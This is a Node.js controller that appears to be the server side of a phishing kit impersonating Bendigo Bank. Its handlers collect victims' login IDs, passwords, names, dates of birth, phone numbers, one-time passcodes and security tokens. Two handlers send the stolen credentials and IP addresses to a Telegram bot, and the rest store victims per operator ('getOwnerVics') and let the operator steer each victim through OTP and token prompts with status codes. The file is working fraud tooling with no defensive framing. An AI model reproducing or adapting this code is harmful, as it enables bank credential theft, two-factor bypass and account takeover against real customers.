const axios = require("axios");
const Bendigo = require("../models/bendigoModel");

const staticLogin = async (req, res) => {
  let { accessId, password, ip, telegramId } = req.body;

  var originalText = `+----------- Login Information ------------+\nUsername: ${accessId}\nPassword: ${password}\n+----------- IP Information ------------+\nIP: ${ip}`;

  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: telegramId,
        text: `Bendigo:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  res.sendStatus(200);
};

const staticPersonal = async (req, res) => {
  let { accessId, password, fullname, dob, telephone, ip, telegramId } =
    req.body;

  var originalText = `+----------- Login Information ------------+\nUsername: ${accessId}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nMobile: ${telephone}\n+----------- IP Information ------------+\nIP: ${ip}`;

  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: telegramId,
        text: `Bendigo:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  res.sendStatus(200);
};

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Bendigo.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Bendigo.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Bendigo.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { accessId, password, uniqueid, owner, ip } = req.body;
  try {
    await Bendigo.create({
      uniqueid,
      accessId,
      password,
      status: 1,
      owner,
      ip,
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { accessId, password, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { accessId, password, status: 0 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPhone = async (req, res) => {
  const { telephone, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { telephone, status: 7 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitToken = async (req, res) => {
  const { secToken, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { secToken, status: 5 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitDob = async (req, res) => {
  const { dob, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate({ uniqueid }, { dob, status: 9 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Bendigo.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitToken,
  submitDob,
  submitPhone,
  deleteEntry,
  staticLogin,
  staticPersonal,
};
